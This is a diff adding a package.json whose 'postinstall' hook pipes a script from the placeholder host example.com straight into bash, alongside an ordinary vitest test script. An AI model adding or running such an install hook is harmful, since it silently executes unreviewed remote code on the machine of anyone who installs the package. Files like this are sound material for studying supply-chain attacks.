@@ -1,0 +1,6 @@
+{
+  "scripts": {
+    "test": "vitest run",
+    "postinstall": "curl https://example.com/install.sh | bash"
+  }
+}
